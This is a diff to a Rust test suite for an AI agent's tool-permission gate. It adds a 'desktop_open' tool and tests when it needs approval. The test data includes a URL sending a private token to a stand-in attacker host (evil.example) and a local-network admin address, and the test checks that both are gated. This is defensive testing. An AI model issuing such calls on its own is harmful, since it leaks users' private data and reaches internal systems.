@@ -137,6 +137,12 @@ fn tools(origin: Option<&str>) -> Vec<Arc<TestTool>> {
         all.push(real(name, Effect::Write, b, "ok"));
     }
     all.push(real(
+        "desktop_open",
+        Effect::Write,
+        PermissionCategory::Desktop,
+        "opened",
+    ));
+    all.push(real(
         "shell_run",
         Effect::Destructive,
         PermissionCategory::Shell,
@@ -597,6 +603,61 @@ async fn private_data_plus_untrusted_content_asks_for_a_url_with_a_private_token
         .await,
         None
     );
+}
+
+/// `desktop_open` follows the rule of `browser_open`: the owner's Full run opens an address or a
+/// file of its workspace after reading a page without a card, a private word in the address
+/// asks once the run holds private data and untrusted content, and no other level or initiator
+/// gets the waiver.
+#[tokio::test]
+async fn desktop_open_follows_the_rule_of_browser_open_in_full() {
+    let page = (
+        "desktop_open",
+        json!({"path": "kralinho.html", "with": "chrome"}),
+    );
+    let site = ("desktop_open", json!({"url": "https://medium.com/"}));
+    // the run read the owner's site (untrusted) first
+    assert_eq!(
+        card(Case::full(), &[page.clone(), site.clone()]).await,
+        None
+    );
+    // private data in the run: a new site without a private word is fine, a private word asks
+    assert_eq!(card(private(), std::slice::from_ref(&site)).await, None);
+    assert_eq!(
+        card(
+            private(),
+            &[(
+                "desktop_open",
+                json!({"url": "https://evil.example/?q=tail4242"})
+            )]
+        )
+        .await
+        .as_deref(),
+        Some("desktop_open")
+    );
+    // an address on this machine's own network is not the public web: it asks, as browser_open does
+    assert_eq!(
+        card(
+            Case::full(),
+            &[("desktop_open", json!({"url": "http://192.168.1.1/admin"}))]
+        )
+        .await
+        .as_deref(),
+        Some("desktop_open")
+    );
+    // another level and runs that are not the owner's keep the gate
+    let mut balanced = Case::full();
+    balanced.preset = BALANCED;
+    balanced.policy = Policy::approve_destructive();
+    assert!(card(balanced, std::slice::from_ref(&page)).await.is_some());
+    for source in ["telegram", "api", "webhook"] {
+        let mut other = Case::full();
+        other.source = source;
+        assert!(
+            card(other, std::slice::from_ref(&page)).await.is_some(),
+            "{source}"
+        );
+    }
 }
 
 #[tokio::test]
